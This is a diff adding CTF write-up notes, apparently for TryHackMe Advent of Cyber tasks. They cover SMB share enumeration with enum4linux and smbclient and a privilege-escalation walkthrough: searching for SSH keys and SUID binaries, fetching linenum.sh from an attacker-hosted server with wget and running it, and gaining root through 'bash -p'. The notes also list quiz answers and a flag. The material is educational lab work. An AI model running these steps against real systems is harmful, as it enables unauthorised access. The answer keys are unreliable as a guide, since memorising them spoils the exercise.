@@ -286,11 +286,80 @@ cat flag.txt
 ## Don't be sElfish
 
 ```shell
+enum4linux -h
+#tool for enumerating Linux machines
+
+enum4linux -U -S 10.10.213.77
+#get possible users and shares
+#shows that one of the shares doesn't require a password, so we can login
+
+smbclient //10.10.213.77/tbfc-santa
+#can login without password
+```
+
+```markdown
+1. Using enum4linux, how many users are there on the Samba server? - 3
+
+2. How many shares are there on the Samba server? - 4
+
+3. Use smbclient to try to login to the shares on the Samba server. What share doesn't require a password? - tbfc-santa
+
+4. Log in to this share, what directory did ElfMcSkidy leave for Santa? - jingle-tunes
 ```
 
 ## The Rogue Gnome
 
 ```shell
+ssh cmnatic@10.10.30.56
+#log into ssh using given creds
+
+pwd
+
+echo $0
+#shows bash shell, we can try to upgrade
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+echo $0
+#/bin/bash
+
+find / -name id_rsa 2>/dev/null
+#trying to find id_rsa file
+
+find / -perm -u=s -type f 2>/dev/null
+#searching for executables with SUID bit set
+
+#we can try uploading and running enumeration scripts
+#in attacker machine
+python3 -m http.server 8080
+
+#in target machine
+cd /tmp
+
+wget http://10.17.48.136:8080/linenum.sh
+#gets linenum.sh in target machine
+
+chmod +x linenum.sh
+
+./linenum.sh
+#gives a lot of output, we've to read through the scan to find exploits
+#this shows that /bin/bash has SUID bit set
+#we can look up on GTFObins to find exploits
+
+/bin/bash -p
+
+id #we have root access now
+
+cat /root/flag.txt
+#we get the flag
+```
+
+```markdown
+1. What type of privilege escalation involves using a user account to execute commands as an administrator? - Vertical
+
+2. What is the name of the file that contains a list of users who are a part of the sudo group? - sudoers
+
+3. What are the contents of flag.txt? - thm{2fb10afe933296592}
 ```
 
 ## Ready, set, elf
